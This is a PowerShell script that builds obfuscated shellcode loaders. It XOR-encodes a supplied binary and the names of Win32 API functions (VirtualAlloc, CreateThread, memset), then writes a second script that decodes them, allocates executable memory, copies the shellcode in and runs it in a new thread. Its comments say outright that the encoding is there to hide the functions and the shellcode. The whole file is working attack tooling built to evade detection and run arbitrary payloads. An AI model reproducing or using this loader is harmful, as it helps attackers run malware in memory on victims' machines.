Param($bin,$name)

#just to suppress useless format errors from string convert
$ErrorActionPreference = 'SilentlyContinue'

#your xor key
$key_master = "fahiuekbhgeuiablw"

#hides win32 functions and shellcode
function xor {
    Param ($xorkey, $array)
    for($i=0;$i-lt$array.Count;$i++){
        $array[$i] -bxor $xorkey[$i%$xorkey.Length]
    }
}

#Csharp code for importing VirtualAlloc etc
$part1 = "[DllImport(`"" -split '' | %{[int][char]$_}
$part2 = ".dll`")] public static extern IntPtr " -split '' | %{[int][char]$_}
$part3 = ");`n" -split '' | %{[int][char]$_}

#will be hidden but ye ~ is a delimiter in the form of function,dll,data format
$tools = @('VirtualAlloc~kernel32~IntPtr w, uint x, uint y, uint z','CreateThread~kernel32~IntPtr u, uint v, IntPtr w, IntPtr x, uint y, uint z','memset~msvcrt~IntPtr x, uint y , uint z')
for($i=0;$i-lt$tools.Count;$i++){$tools[$i] = $tools[$i] -split ''|%{[int][char]$_}}
$run = Get-Content $bin -Encoding Byte
$key = $key_master -split ''| %{[int][char]$_}

echo @'
function fix {
    Param ($kee, $array)
    $fix = for($i=0;$i-lt$array.Length;$i++){(($array[$i])-bxor$kee[$i%$kee.Length])}
    return $fix
}

function do_it {
    Param ($parse)
    $loader = ""
    for($i=0;$i-lt$parse.Count;$i++){
        $parse_now = $parse[$i] -split '~'
        $loader+=($part1+$parse_now[1]+$part2+$parse_now[0]+"("+$parse_now[2]+$part3)
    }
    $cal = Add-Type -m $loader -Name "Win32" -names "Win32Functions" -pas
    $mem_loc=$cal::(($data[0] -split '~')[0])(0, (4097-1),(12289-1),(65-1))
    for($i=0;$i-lt$run.Length;$i++){[void]$cal::(($data[2] -split '~')[0])(($mem_loc.ToInt64()+$i), $run[$i], 1);}
    [void]$cal::(($data[1] -split '~')[0])(0,0,$mem_loc,0,0,0)
}
'@ > $name
(xor -xorkey $key -array $part1) -join ',' -replace '^', '$part1 = @(' -replace '$', ')' >> $name
(xor -xorkey $key -array $part2) -join ',' -replace '^', '$part2 = @(' -replace '$', ')' >> $name
(xor -xorkey $key -array $part3) -join ',' -replace '^', '$part3 = @(' -replace '$', ')' >> $name
$tools=for($i=0;$i-lt$tools.Count;$i++){(xor -xorkey $key -array $tools[$i]) -join ',' -replace '^', '@(' -replace '$', ')'} >> $name
(echo $tools) -join ',' -replace '^','$data = @(' -replace'$',')' >> $name
(xor -xorkey $key -array $run) -join ',' -replace '^','$run = @(' -replace '$',')' >> $name
echo ('$word = '+"`"$key_master`"") >> $name
echo @'
$part1 = (fix -kee $word -array $part1|%{[char]$_}) -join ''
$part2 = (fix -kee $word -array $part2|%{[char]$_}) -join ''
$part3 = (fix -kee $word -array $part3|%{[char]$_}) -join ''
$run = (fix -kee $word -array $run)
for($i=0;$i-lt$data.Count;$i++){$data[$i] = (fix -kee $word -array $data[$i]|%{[char]$_}) -join ''}


do_it -parse $data
'@ >> $name
$ErrorActionPreference = 'Continue'
